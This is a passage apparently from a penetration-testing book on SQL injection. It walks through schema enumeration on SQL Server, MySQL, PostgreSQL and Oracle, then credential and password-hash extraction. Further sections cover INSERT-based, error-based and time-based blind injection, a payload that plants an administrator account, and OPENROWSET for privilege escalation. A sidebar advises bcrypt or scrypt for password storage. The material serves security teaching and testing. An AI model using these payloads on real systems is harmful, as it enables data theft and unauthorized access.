corresponding URL is obviously the following:  \nhttp://www.victim.com/products.aspid=12+un ion+select+null,name,null,null+from+e-\nshop..sysobjects+where+xtype%3D‘U’ -- \nThe page that results will look something like the screenshot shown in Figure 4.12.  \n \nFigure 4.12  Enumerating All Tables of a Specifi c Database \nAs you can see, there are some interesting tables, with customers  and transactions  probably \nbeing the ones with the most promising contents! To extract those data, the next step is to \n\nenumerate the columns of these tables. We will look at two di fferent ways to extract the names \nof the columns of a given table (e.g. customers ). Here is the first one:  \nSELECT name FROM e- shop..syscolumns WHERE id = (SELECT id FROMe- shop..sysobjects WHERE name \n= ‘customers’)  \nIn this example, we nest a SELECT  query in to another SELECT  query. We start by selecting the \nname  field of the e -shops..syscolumns  table, which contains all the columns of the e -shop \ndatabase. Because we are only interested in the columns of the customers  table, we add a \nWHERE clause, using the id  field, that is used in the syscolumns  table to uniquely identify the \ntable that each column belongs to. What’s the right id ? Because every table listed in sysobjects  \nis identified by the same id , we need to select the id  value of the table whose name is \ncustomers , and that is the second SELECT . If you don’t like nested queries and are a fan of \njoining tables, the following query extracts the same data:  \nSELECT a.name FROM e -shop..syscolumns a,e- shop..sysobjects b WHERE b.name =‘customers’ AND \na.id = b.id  \nWhichever approach you decide to take, the resultant page will be similar to the screenshot \nin Figure 4.13.  \n \nFigure 4.13  Example of a Successful Enumeration of the Columns of a Specific Table \nAs you can see, we now know the names of the columns of the customers  table. We can \nguess that both login and passwords  are of type string , and we can therefore return them with \nyet another UNION SELECT , this time using both the Type and Description  fields of the \noriginal query. This is performed by the following URL:  \nhttp://www.victim.com/products.aspid=12+union+select+null,login,password,null+from+e-\nshop..customers--  \nAs you can see, this time we use two column names in our injected query. The result, which \nfinally contains the data we were looking for, is in the screenshot shown in Figure 4.14.  \n\n \nFigure 4.14  Finally Getting the Data: Username and Passwords, in this Case!  \nBingo!! However, the result is not just a very long list of use rs. It seems that this application \nlikes to store user passwords in clear text instead of using a hashing algorithm. The same \nattack sequence could be used to enumerate and retrieve any other table that the user has access to, but having arrived at this point, you might just call the client, tell them they have a huge problem (actually, more than just one), and call it a day . \nAre you owned?  \nHow to Store Passwords in Your Database  \nThe scenario that was just illustrated, in which a few queries have been enoug h to retrieve a list of usernames and \npasswords unencrypted (in clear text), is not as unusual as you might think. During our penetration tests and \nsecurity assessments, we (the book’s authors) have come across plenty of cases in which vulnerable applicati ons \nhad passwords and other sensitive data is stored in clear text.  \nThe danger of storing users’ passwords in clear text poses other dangers: Because human beings have the \ntendency to reuse the same password for several different online services, a successful attack such as the one \n\ndescribed might pose a threat not only to  the users’ accounts on victim.com , but also to other areas of their online \nidentity, such as online banking and private e -mail. And victim.com  might even be liable for these addit ional \nbreak -ins, depending on the specific laws of the country where it resides!  \nUp to just some time ago, the recommended approach for storing passwords was a cryptographic hash \nfunction . A cryptographic hash function transforms an arbitrary value (in our  case, the user’s password) into a \nfixed -length string (called the hash value ). This function has several mathematical properties, but here we are \nmostly interested in two of them:  \n• Given a hash value, it is extremely difficult to construct a value that generates it.  \n• The probability that two different values generate the same hash value is extremely low.  \nStoring the hash value of the password instead of the password itself still allows users to authenticate, because \nit’s enough to calculate the hash valu e of the password they provide and compare it with the stored hash value. \nHowever, it provides a security advantage, because if the list of hash values is captured, the attacker would not be \nable to convert them back to the original passwords without going  through a brute -force attack. Adding an \nadditional, random value to the hash input (called a “salt”) also protects the password against precomputation -\nbased attacks.  \nUnluckily, in the past few years we have witnessed an enormous increase in the computing power available to \nattackers, mostly thanks to the use of Graphical Processing Units, which allow massively parallelized \ncomputations. Since all modern general -purpose cryptographic hash functions have been designed for speed, they \nare inherently vulnerabl e to modern GPU -based brute -force attacks. The answer is using an algorithm that is \nspecifically designed to be computationally very slow and expensive, such as bcrypt or scrypt. bcrypt is an \nadaptive password hashing algorithm, with a work factor  which al lows the user to decide how expensive the \nhashing computation will be. With a proper tuning of the work factor, any brute -force attack against bcrypt will \nbe several orders of magnitude slower than an attack against MD5 or SHA256.  \nscrypt is based on the co ncept of “sequential memory -hard functions,” meaning that the hashing is not only \nCPU intensive but also memory intensive, making things hard even for a custom hardware attack, in which \nintegrated circuits specifically designed for cryptographic brute -force attacks are used.  \nOf course, using such algorithms will not protect you against SQL injection attacks (fear not —we wrote \nChapters 8  and 9 for that), but will greatly protect your  customers in case the data fall into the wrong hands.  \nMore information on bcrypt can be found at www.usenix.org/events/usenix99/provos.html  and \nhttp://codahale.com/how -to-safely -store -a-password/ , while scrypt is fully described at the address \nwww.tarsnap.com/scrypt.html . scrypt provides a level of security that is even high er than bcrypt, but at the time \nof writing it is a self -contained executable, making it less -useful compared to bcrypt, which has a set of APIs and \nis supported out -of-the-box by all modern technologies for Web application development. Whichever you decide  \nto use, you will be a lot more secure than trusting MD5 or SHA. So you have no excuse: stop using generic \nhashing algorithms to store your passwords!  \nMySQL  \nAlso on MySQL, the technique for enumerating a database and extracting its data follows a \nhierarchical approach: You start extracting the names of the databases, and then proceed down to tables, columns, and finally the data themself.  \nThe first thing you a re usually interested in is the name of the user performing the queries. \nYou can retrieve this with one of the following queries:  \nSELECT user();  \nSELECT current_user;  \nTo list the databases that are present on the remote MySQL installation, you can use the \nfollowing query, if you have administrative privileges:  \nSELECT distinct(db) FROM mysql.db;  \nIf you don’t have administrative privileges, but the remote MySQL version is 5.0 or later, \nyou can still obtain the same information using information_schema, by inje cting the following \nalternative:  \nSELECT schema_name FROM information_schema.schemata;  \nQuerying information_schema allows you to enumerate the whole database structure. Once \nyou have retrieved the databases, and you have found one of them that looks particularly interesting (e.g. customers_db), you can extract its table names with the following query:  \nSELECT table_schema,table_name FROM information_schema.tables WHERE table_schema = \n‘customers_db’  \nIf you prefer to obtain a list of all the tables of all datab ases, you can simply omit the \nWHERE clause, but you might want to modify it as follows:  \nSELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ \nAND table_schema != ‘information_schema’  \nSuch a query will retrieve all tables except the ones belonging to mysql  and \ninformation_schema, two built -in databases whose tables you are probably not interested in. \nOnce you have the tables it is time to retrieve the columns, again avoiding all entries  that \nbelong to mysql  and information_schema:  \nSELECT table_schema, table_name, column_name FROM information_schema.columns WHERE \ntable_schema != ‘mysql’ AND table_schema != ‘information_schema’  \nThis query will provide you with a comprehensive view of all databases, tables, and \ncolumns, all packaged in one nice table, as you can see in the following example:  \nmysql> SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE \ntable_schema != ‘mysql’ AND  \ntable_schema != ‘information_schem a’; \n+--------------+ ---------------+ --------------- + \n| table_schema | table_name | column_name |  \n+--------------+ ---------------+ --------------- + \n| shop | customers | id |  \n| shop | customers | name |  \n| shop | customers | surname |  \n| shop | customers | login |  \n| shop | customers | password |  \n| shop | customers | address |  \n| shop | customers | phone |  \n| shop | customers | email |  \n<snip>  \nAs you can see, if your Web application allows you to perform a UNION SELECT , such a \nquery gives you a full description of t he whole database server in one simple shot! \nAlternatively, if you prefer to go the other way around and look for a table that contains a \nspecific column you are interested into, you can use the following query:  \nSELECT table_schema, table_name, column_name FROM information_schema.columnsWHERE \ncolumn_name LIKE ‘password’ OR column_name LIKE ‘credit_card’;  \nand you might obtain something such as this:  \n+--------------+ ---------------+ --------------- + \n|table_schema | table_name | column_name |  \n+--------------+ ---------------+ --------------- + \n| shop | users | password |  \n| mysql | user | password |  \n| financial| customers | credit_card |  \n+--------------+ ---------------+ --------------- + \n2 rows in set (0.03 sec)  \ninformation_schema  does not contain only the structure of the database, but also all the \nrelevant information regarding the privileges of the database users, and the  permissions they \nhave been granted. For instance, to list the privileges granted to the various users you can execute the following query:  \nSELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;  \nSuch a query will return output similar to the following:  \n+---------------------+ ------------------------- +--------------+  \n| guarantee | privilege_type | is_grantable | \n+---------------------+ ------------------------- +--------------+  \n| ‘root’@‘localhost’ | SELECT | YES |  \n| ‘root’@‘localhost’ | INSERT | YES |  \n| ‘root’@‘localhost’ | UPDATE | YES |  \n| ‘root’@‘localhost’ | DELETE | YES |  \n| ‘root’@‘localhost’ | CREATE | YES |  \n| ‘root’@‘localhost’ | DROP | YES |  \n| ‘root’@‘localhost’ | RELOAD | YES |  \n| ‘root’@‘localhost’ | SHUTDOWN | YES |  \n| ‘root’@‘localhost’ | PROCESS | YES |  \n| ‘root’@‘localhost’ | FILE | YES |  \n| ‘root’@‘localhost’ | REFERENCES | YES |  \n| ‘root’@‘localhost’ | INDEX | YES |  \n<snip>  \nIf you need to know the privileges granted to users on the different databases, the following \nquery will do the job:  \nSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges  \nUnfortunately, information_schema is available only in MySQL 5 and later, so if you are \ndealing with an earlier version the process will be more difficult, as a brute -force attack might \nbe the only way to determine the names of tables and colum ns. One thing you can do \n(however, it’s a little complicated) is access the files that store the database, import their raw \ncontent into a table that you create, and then extract that table using one of the techniques you’ve seen so far. Let’s briefly walk  through an example of this technique. You can easily \nfind the current database name with the following query:  \nSELECT database()  \nThe files for this database will be stored in a directory with the same name as the database \nitself. This directory will be con tained in the main MySQL data directory, which is returned by \nthe following query:  \nSELECT @@datadir  \nEach table of the database is contained in a file with the extension MYD . For instance, here \nare some of the MYD files of a default mysql  database:  \ntables_priv.MYD  \nhost.MYD  \nhelp_keyword.MYD  \ncolumns_priv.MYD  \ndb.MYD  \nYou can extract the contents of a specific table of that database with the following query:  \nSELECT load_file(‘databasename/tablename.MYD’)  \nHowever, without information_schema  you will have to brute -force the table name for this \nquery to succeed. Also, note that load_file  (discussed in more detail in Chapter 6 ) only allows \nyou to retrieve a maximum number of bytes that is specified in the @@max_allowed_packet  \nvariable, so this technique is not suited for tables that store large amounts of data.  \nPostgreSQL  \nThe usual hierarchical approach obviously works for PostgreSQL as well. The list of all \ndatabases can be extracted with the following:  \nSELECT datname FROM pg_database  \nIf you want to know which one is the current database, it is easy enough with the following \nquery:  \nSELECT current_database()  \nAs for the users, the following query will return the complete list: \nSELECT usename FROM pg_user  \nThe cu rrent user can be extracted with one of the following queries:  \nSELECT user;  \nSELECT current_user;  \nSELECT session_user;  \nSELECT getpgusername();  \nFour different ways to get the current user? Well, there are some minor differences between \nsome of them: session_user returns the user who started the current connection to the database, \nwhile current_user and user (they are equivalent) return the current  execution context, meaning \nthat this value is the one used for checking permissions. They usually return the same value, unless “SET ROLE” has been called at some point. Finally, getpgusername() returns the user associated with the current thread. Again, it is somewhat unlikely you will get a different result.  \nIn order to enumerate all tables in all schemas that are present in the database you are \nconnected to, you can use one of the following queries:  \nSELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = \nc.relnamespace WHERE c.relkind IN (‘r’,’’) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) \nAND pg_catalog.pg_table_is_visible(c.oid)  \nSELECT tablename FROM pg_tables WHERE tablename NOT LIKE ‘pg_%’ AND tablename NOT LIKE \n‘sql_%’  \nIf you want to extract a list of all columns, you can do so with the following query:  \nSELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE \n(C.relkind=‘r’) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)\n \nThis query will extract all columns in the ‘public’ schema. Change the last ILIKE clause if \nyou need to extract the columns of another schema. \nIf you need to find the tables that contain columns you might be interested in (obvious \nexamples: “password” and “passwd”), you can use the following query, modifying the last \nLIKE clause to fit your needs:  \nSELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE \n(C.relkind=‘r’) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) \nAND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’\n \nFor space reasons, all t he queries that could be useful for enumerating information for a \nspecific technology cannot be included, but some cheat sheets are available in Chapter 11. \nCheat sheets are also available online that can assist you in quickly locating the proper query for handling a specific job on a specific database, such as those found at http://pentestmonkey.net/cheat- sheets/ . \nOracle  \nThe last example we will cover is how to enum erate the database schema when the back -end \ndatabase server is Oracle. An important fact to remember when using Oracle is that you will normally be accessing only one database at a time, as databases in Oracle are normally accessed via a specific connectio n, and multiple databases accessed by an application will \ngenerally have different connections. Therefore, unlike SQL Server and MySQL, you won’t be enumerating the databases present when finding the database schema.  \nThe first thing you may be interested i n is the list of tables that belong to the current user. In \nthe context of an application, this will generally be the application tables in the database:  \nselect table_name from user_tables;  \nYou can extend this to look at all of the tables in the database a nd their owners:  \nselect owner,table_name from all_tables;  \nYou can enumerate some more information about your application tables to determine the \nnumber of columns and rows that are present in the tables as follows:  \nselect a.table_name||‘[‘||count(∗ )||’]=’||num_rows from user_tab_columns a,user_tables b \nwhere a.table_name=b.table_name group by a.table_name,num_rows  \nEMP[8]=14  \nDUMMY[1]=1  \nDEPT[3]=4  \nSALGRADE[3]=5  \nAnd you can enumerate the same information for all accessible/available tables, including \ntheir user s, table names, and the number of rows in these tables as follows:  \nselect b.owner||‘.’||a.table_name||‘[’||count( ∗)||‘]=’||num_rows from all_tab_columns a, \nall_tables b where a.table_name=b.table_name group by b.owner,a.table_name,num_rows  \nFinally, you can enumerate the columns and data types in each table as follows, allowing \nyou to get a more complete picture of the database schema:  \nselect table_name||‘:’||column_name||‘:’||data_type||‘:’||column_id from user_tab_columns \norder by table_name,column_id  \nDEPT:DEPTNO:NUMBER:1  \nDEPT:DNAME:VARCHAR2:2  \nDEPT:LOC:VARCHAR2:3  \nDUMMY:DUMMY:NUMBER:1  \nEMP:EMPNO:NUMBER:1  \nEMP:ENAME:VARCHAR2:2  \nEMP:JOB:VARCHAR2:3  \nEMP:MGR:NUMBER:4  \nEMP:HIREDATE:DATE:5  \nEMP:SAL:NUMBER:6  \nEMP:COMM:NUMBER:7  \nEMP:DEPTNO:NUMBER:8  \nSALGRADE:GRADE:NUMBER:1  \nSALGRADE:LOSAL:NUMBER:2  \nSALGRADE:HISAL:NUMBER:3  \nAnother thing you may be interested in is obtaining the privileges of the current database \nuser, which you can do as an unprivileged user. The following queries return the privileges of \nthe current user. In O racle, there are four different kinds of privileges ( SYSTEM, ROLE, \nTABLE, and COLUMN ). \nTo get system privileges for the current user:  \nselect ∗ from user_sys_privs; --show system privileges of the current user  \nTo get role privileges for the current user:  \nselect ∗ from user_role_privs; --show role privileges of the current user  \nTo get table privileges for the current user:  \nselect ∗ from user_tab_privs;  \nTo get column privileges for the current user:  \nselect ∗ from user_col_privs;  \nTo get the list of all possible privileges you must replace the user  string in the preceding \nqueries with all , as follows. \nTo get all system privileges: \nselect ∗ from all_sys_privs;  \nTo get all role privileges:  \nselect ∗ from all_role_privs;  \nTo get all table  privileges: \nselect ∗ from all_tab_privs;  \nTo get all column privileges:  \nselect ∗ from all_col_privs;  \nNow that you have a listing of the database schema and some information about your \ncurrent user, you may be interested in enumerating other information in the database, such as a \nlist of all of the users in the database. The following query returns a list of all users in the database. This query has the advantage that, by default, it can be executed by any user of the database:  \nselect username,created from a ll_users order by created desc;  \nSCOTT 04– JAN–09 \nPHP 04–JAN–09 \nPLSQL 02– JAN–09 \nMONODEMO 29– DEC–08 \nDEMO1 29– DEC–08 \nALEX 14– DEC–08 \nOWBSYS 13– DEC–08 \nFLOWS_030000 13– DEC–08 \nAPEX_PUBLIC_USER 13– DEC–08 \nYou can query additional items as well, depending on the version of the database in use. For \nexample, an unprivileged user in versions up to Oracle 10g R2 can retrieve the database usernames and password hashes with the following SELECT  statement: \nSELECT name, password, astatus FROM sys.user$ where type#>0 and length(password)=16 -- \nastatus (0=open, 9=locked&expired)  \nSYS AD24A888FC3B1BE7 0  \nSYSTEM BD3D49AD69E3FA34 0  \nOUTLN 4A3BA55E08595C81 9  \nYou can test or crack the password hashes with publicly available to ols, possibly allowing \nyou to obtain credentials for a privileged database account such as SYS. In Oracle 11g, Oracle \nhas changed the password hashing algorithm in use, and the password hash is now located in a different column—spare4, as follows:  \nSELECT name,spare4 FROM sys.user$ where type#>0 and length(spare4)=62  \nSYS \nS:1336FB26ACF58354164952E502B4F726FF8B5D382012D2E7B1EC99C426A7  \nSYSTEM  \nS:38968E8CEC12026112B0010BCBA3ECC2FD278AFA17AE363FDD74674F2651  \nIf the current user is a privileged one, or access as a p rivileged user has been obtained, you \ncan look for a number of other interesting pieces of information in the database structure. Since Oracle 10g R2, Oracle offers the capability of transparently encrypting columns in the database. Normally, only the most  important or sensitive tables will be encrypted, and \ntherefore you are interested in finding these tables as follows:  \nselect table_name,column_name,encryption_alg,salt from dba_encrypted_columns;  \nTABLE_NAME COLUMN_NAME ENCRYPTION_ALG SALT  \n--------------------------------------------------------------------------------------------\n---------  \nCREDITCARD CCNR AES256 NO  \nCREDITCARD CVE AES256 NO  \nCREDITCARD VALID AES256 NO  \nAnother piece of information that could be useful, if you have a privileged account, is to \nknow what database administrator (DBA) accounts exist within the database, as follows:  \nSelect grantee,granted_role,admin_option,default_role from dba_role_privs where \ngranted_role=‘DBA’;  \nTips  \nEnumerating a full database by hand can be a very tedious task. Although it can be fairly easy to quickly code a \nsmall program to perform the task for you (using your favorite scripting language), several free tools are available \nthat automate the process.  At the end of this chapter, three of them: sqlmap, Bobcat, and bsql will be illustrated.  \n \nInjecting into “INSERT” queries  \nAs mentioned earlier in the chapter, you might have to deal with cases in which the only \nvulnerable queries are the ones that modify t he data on the database —the risk here is that your \nattack will corrupt production data. This should rarely be the case, as penetration testing should preferably be performed on test environments, but sometimes reality is different.  \nThere are two main scenarios we cover here: in the first one, you have found a way to \ninclude in the data you are passing to an INSERT or an UPDATE some information from other tables, and then you use a different part of the application to read that information. An example is an application that allows you to create and manage a personal profile, in which one or more of the fields are vulnerable. If you inject SQL code that fetches data from somewhere else in the database (for instance, password hashes), you will then be able to g rab that information by \nsimply viewing the updated profile. Another example is an application that has file upload capability, in which the description accompanying the file is vulnerable to SQL injection.  \nThe second scenario we are going to discuss is one in which the data you are looking for is \nimmediately returned by the query you are injecting into (e.g. through an error message or a timing attack).  \nIt is not possible to cover all possible cases and permutations, but we will illustrate examples \nfor both of the aforementioned scenarios to show how such cases can be handled in order to \nprovide some guidance on handling situations you may encounter. In these situations, \nhowever, a bit of creativity is often needed. In the following examples we discuss INSER T \nqueries in particular, however the same scenarios and techniques also applies to other commands belonging to the Data Manipulation Language (DML), such as UPDATE and DELETE.  \nFirst Scenario: Inserting User Determined Data  \nUsually this kind of injection is not too hard to handle, as long as the application is not very \npicky about the type of data that we are trying to inject. In general, things are relatively easy if the column that we can inject into is not  the last one in the table. For instance, consider the \nfollowing example: \nINSERT INTO table (col1, col2) VALUES (‘injectable’, ‘not injectable’);  \nIn this case, the strategy is to close the string passed as the first column, and then to craft the \nSQL code needed to “recreat e” the second column with the data that we are interested in, and \nthen comment out the rest of the query. For example, let’s say that we are submitting a first \nand a last name, and that the first name is the vulnerable field. The resulting URL of the \norigi nal request would be something like the following:  \nhttp://www.victim.com/updateprofile.asp?firstname=john&lastname=smith  \nThis would translate in the following query:  \nINSERT INTO table (firstname, lastname) VALUES (‘john’, ‘smith’)  \nWe can therefore inject t he following string as the firstname  parameter:  \njohn’,(SELECT TOP 1 name + ‘ | ’ + master.sys.fn_varbintohexstr(password_hash) from \nsys.sql_logins))--  \nThe resulting query will therefore be the following, with the underlined code being what we \nhave injected : \nINSERT INTO table (firstname, lastname) VALUES (‘john’,(SELECT TOP 1 name + ‘ | ’ + \nmaster.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- ‘,‘smith’)  \nWhat happens here? Very simply, we are performing the following actions:  \n• We start with some random value for the first column to insert (“john”) and we close the \nstring with a single quote.  \n• For the second column to insert, we inject a subquery that concatenates in one string the \nname and hash of the first user of the database ( fn_varbintohexs tr() is used to convert the \nbinary hash into a hexadecimal format)  \n• We close all needed parentheses and comment out the rest of the query, so that whatever we \nput in the “lastname” field (“smith” in this case) and any other spurious SQL code will not \nget in the way.  \nIf we launch this attack, and then we view the profile we have just updated, our last name \nwill look like the following:  \nsa | 0x01004086ceb6370f972f9c9135fb8959e8a78b3f3a3df37efdf3  \nBang! We have just extracted the “crown jewels” and injected them back into the database \nitself in a position where we can easily see them!  \nUnluckily, things can sometimes be a bit harder, in which case some creativity is needed. A \ngood example of this sce nario (and an instructive lesson of the tricks one often needs to resort \nto) happened to one of the authors a while ago, during a penetration test of an application that allowed users to upload files to the server and specify their name. The back- end datab ase was \nMySQL, and the vulnerable query was similar to the following:  \nINSERT INTO table (col1, col2) VALUES (‘not injectable’, ‘injectable’);  \nThe injectable parameter is the last one, which complicates things, as we cannot close one \nparameter and start crafting the following one from scratch, as we did in the previous example. Now we have to deal with a parameter that has been “opened but not yet closed” by the application, and this restricts our possibilities a little bit.  \nThe first thought would obviously  be to use a subquery and concatenate the result to the user \ncontrolled field, as in the following example:  \nINSERT INTO table (col1, col2) VALUES (‘foo’,‘bar’ || (select @@version)) --  \nNow, if MySQL is in ANSI mode (or any other mode that implements \nPIPES_ AS_QUOTES, like DB2, ORACLE, or MAXDB), then this works fine. However, this \nwas not the case: when PIPES_AS_QUOTES is not implemented (as it is the case in TRADITIONAL mode), the || operator is parsed as an OR logical operator and not as a concatenation op erator.  \nThe CONCAT function would be an alternative, as it can be used after VALUES, but it \nneeds to be at the very beginning of the column parameter, as in the following example:  \nINSERT INTO table (col1, col2) VALUES (‘foo’, CONCAT(‘bar’,(select @@version)))--  \nIn our case, we are injecting after the opening quote has been used, which means that \nCONCAT is out of question (now you will probably understand why whether the injectable \nparameter is the last one makes a non -trivial difference!).  \nThe trick here is  that in MySQL when adding an integer and a char value, the integer has \noperator precedence and “wins,” as in the following example:  \nmysql> select ‘a’ + 1;  \n+----------+  \n| ‘a’ + 1 |  \n+----------+  \n| 1 |  \n+----------+  \n1 row in set, 1 warning (0.00 sec)  \nWe can u se this trick to extract arbitrary data, convert such data into an integer (unless it’s \nan integer already), and then “add” it to the initial part of the string under control, as in the following example: \nINSERT INTO table (col1,col2) VALUES (‘foo’, ‘d’ + substring((SELECT @@version),1,1)+’’);  \nThe substring()  function extracts the first character of @@version (in our case, ‘5’). That \ncharacter is then “added” to ‘d’, and the result is actually, 5:  \nmysql> select (‘a’ + substring((select @@version),1,1));  \n+-------------------------------------------+  \n| (‘a’ + substring((select @@version),1,1)) |  \n+-------------------------------------------+  \n| 5 |  \n+-------------------------------------------+  \n1 row in set, 1 warning (0.00 sec)  \nThe last catch was that whitespaces were filtered, but that was easy to overcome by using \ncomments. The actual attack was therefore as follows:  \nINSERT INTO table (col1,col2) VALUES (‘foo’, \n‘d’+/∗∗/substring((select/∗∗/@@version),1,1)+’’);  \nAs for converting  non-integer characters, this can be done with the ASCII() function:  \nINSERT INTO table (col1, col2) VALUES (‘foo’,‘bar’+/∗∗ /ascii(substring(user(),1,1))+’’)  \nINSERT INTO table (col1, col2) VALUES (‘foo’,‘bar’+/∗∗ /ascii(substring(user(),2,1))+’’)  \nINSERT INTO table (col1, col2) VALUES (‘foo’,‘bar’+/∗∗ /ascii(substring(user(),3,1))+’’)  \nSecond Scenario: Generating INSERT Errors  \nIn the second scenario, you want to extract information from the database using an INSERT \nquery, but you want to be able to do that without the query succeeding, in order to avoid tainting the tables of the database or adding unnecessary log entries.  \nA relatively simple situation is when your INSERT returns an error message with the \ninformation you are looking for. Let’s imagine that you ar e required to enter your name and \nage in the Web site, and that the name field is injectable. The query will look something like the following:  \nINSERT INTO users (name, age) VALUES (‘foo’,10)  \nYou can exploit this scenario by injecting in the name  column to trigger an error, for \ninstance injecting the following:  \nfoo’,(select top 1 name from users where age=@@version))--  \nWhat happens here? You inject a subquery that attempts to retrieve a row from the user \ntable, but which fails because @@version is not numer ic, returning the following message:  \nConversion failed when converting the nvarchar value ‘Microsoft SQL Server 2008 (RTM) - \n10.0.1600.22 (Intel X86)  \n  Jul 9 2008 14:43:34  \n  Copyright (c) 1988 -2008 Microsoft Corporation  \n  Standard Edition on Windows NT 5.2 <X86> (Build 3790: Service Pack 2)  \n ‘ to data type int.  \nNice! The version details have been extracted, but the INSERT query was not executed. \nHowever, things are not always this simple, as the application might not be willing to give us \nsuch verbose error  messages. In some cases, we might actually need the inner query to succeed  \ninstead of failing, in order to obtain the information we are looking for, but still with the outer query (the INSERT) failing in order to avoid modifying data. For instance, the inner query might be used for a time -based blind injection, which means that depending on the value of \nsome bit the subquery will or will not introduce a time delay. In both cases, the subquery needs to succeed, not fail (but the outer INSERT must fail). \nA similar scenario has been recently investigated by Mathy Vanhoef on MySQL. T he \noverall strategy is based on scalar subqueries , which are subqueries that return a single value \nas opposed to multiple columns or rows. For instance, consider the following query:  \nSELECT (SELECT column1 FROM table 1 WHERE column1 = ‘test’)  \nIf the inner query returns only one value (or NULL), the outer query will execute \nsuccessfully. However, if the inner query returns more than one result, MySQL will abort the outer one and provide the following error to the user:  \nERROR 1242 (21000): Subquery returns more than 1 row  \nNow, note that even when the outer query is aborted, the inner one has already been \nsuccessfully executed. This means that if we can inject two nested SELECT queries so that the inner extracts information but the outer is guaranteed to fail, then we are su ccessfully \nextracting data without allowing the original INSERT to be executed.  \nThe easiest example is to use an inner query that evaluates some condition and then pauses \nfor a few seconds depending on the result: measuring the time between our request and  the \nresponse we will be able to infer such result. For instance, consider the following query:  \nSELECT (SELECT CASE WHEN @@version LIKE ‘5.1.56%’ THEN SLEEP(5) ELSE ‘somevalue’ END FROM \n((SELECT ‘value1’ AS foobar) UNION (SELECT ‘value2’ AS foobar)) ALIAS)  \nThe CASE clause checks the exact version of MySQL, and if a specific version is \nencountered the SLEEP command is executed for 5  s. This will tell us whether the version is \nthere, but at the same time the UNION command will ensure that two rows are returne d to the \nouter SELECT, therefore generating the error. Now, let’s assume that we can inject into the \nfollowing query:  \nINSERT INTO table 1 VALUES (‘injectable_parameter’)  \nWe can inject the following as the parameter:  \n‘|| SELECT (SELECT CASE WHEN @@version LIKE ‘5.1.56%’ THEN SLEEP(5) ELSE ‘somevalue’ END \nFROM ((SELECT ‘value1’ AS foobar) UNION (SELECT ‘value2’ AS foobar)) ALIAS) || ‘  \nThe resulting query would be:  \nINSERT INTO table 1 VALUES (‘‘|| SELECT (SELECT CASE WHEN @@version LIKE ‘5.1.56%’ THEN \nSLEEP(5) ELSE ‘somevalue’ END FROM ((SELECT ‘value1’ AS foobar) UNION (SELECT ‘value2’ AS \nfoobar)) ALIAS) || ’’)  \nWhat we are doing here is using the concatenation operator ( ||) to inject our nested \nSELECT query in the string expected by the INSERT. The query will fingerprint the database version but without actually modifying any data.  \nObviously, timing attacks tend to be very slow when used to extract non- trivial amounts of \ndata: however, if different error messages from the inner query result depending on the condition we check, things can be much faster. The REGEXP operator can be used for this \ntask, as we can see in the following example query:  \nSELECT (SELECT ‘a’ REGEXP (SELECT CASE WHEN <condition> THEN ‘.∗ ’ ELSE ‘∗’ END (FROM ((SELECT \n‘foo1’ AS bar) UNION (SELECT ‘foo2’ AS bar) foobar)  \nIf the condition is true, then the ‘. ∗’ valid regular expression is used, two rows are returned \nto the outermost SELECT, and we receive the usual error:  \nERROR 1242 (21000): Subquery returns more than 1 row  \nHowever, if the conditi on is false, then REGEXP is fed ‘ ∗,’ which is not  a valid regular \nexpression, and the database server will return the following error instead:  \nERROR 1139 (42000): Got error ‘repetition- operator operand invalid’ from regexp  \nIf the Web application in the front -end returns different results for these two errors, we can \nforget the slow time -based approach and start dumping tables at light speed.  \nMathy’s original research covers all the details and provides further examples, and is \navailable at www.mathyvanhoef.com/2011/10/exploiting -insert -into-sql-injections.html.  \nOther Scenarios  \nThere are other cases in which you might use an INSERT statement in your attack, which ma y \nnot necessarily be related to this being the only type of query you can inject into. For instance, \nan INSERT query can be extremely useful when you can use stacked queries and you have managed to extract the table containing the users of the application:  if you discovered that such \ntable contains an e- mail address, a hash of the password, and a privileges level where the value \nzero indicates an administrator, you will probably want to inject something like the following, to get instant privileged access to the application:  \nhttp://www.victim.com/searchpeople.asp?name=’;INSERT+INTO+users(id,pass,privs)+VALUES+(‘atta\ncker@evil.com’,‘hashpass’,0)--  \nAs you can see, injecting into INSERT queries is not much more difficult than attacking the \nmore common SELECT one s. Depending on the situation, you will only need some extra care \nin order to avoid side effects such as filling with database with garbage, and exercise some extra creativity in overcoming hurdles such as those discussed.  \nEscalating privileges  \nAll modern database servers provide their administrators with very granular control over the actions that users can perform. You can carefully manage and control access to the stored information by giving each user very specific rights, such as the ability to access only specific databases and perform only specific actions on it. Maybe the back- end database server that you \nare attacking has several databases, but the user who performs your queries might have access to only one of them, which might not contain the most  interesting information. Or maybe your \nuser has only read access to the data, but the aim of your test is to check whether data can be \nmodified in an unauthorized manner.  \nIn other words, you have to deal with the fact that the user performing the queries is just a \nregular user, whose privileges are far lower compared to the DBA’s.  \nDue to the limitations of regular users, and to fully unleash the potential of several of the \nattacks you have seen so far, you will need to obtain access as an administrator. Luckily for us, in several cases it is possible to obtain these elevated privile ges. \nSQL Server  \nOne of an attacker’s best friends when the target is Microsoft SQL Server is the OPENROWSET  command. OPENROWSET  is used on SQL Server to perform a one -time \nconnection to a remote OLE DB data source (e.g. another SQL Server). A DBA can use i t, for \ninstance, to retrieve data that resides on a remote database, as an alternative to permanently “linking” the two databases, which is better suited to cases when the data exchange needs to be performed on a regular basis. A typical way to call OPENRO WSET  is as follows:  \nSELECT ∗ FROM OPENROWSET(‘ SQLOLEDB’ , ‘Network=DBMSSOCN; Address=10.0.2.2;uid=foo; \npwd=password’ , ‘SELECT column1 FROM tableA ’) \nHere we connected to the SQL Server at the address 10.0.2.2 as user foo , and we ran the \nquery select column1 from tableA , whose results will be transferred back and returned by the \noutermost query. Note that ‘ 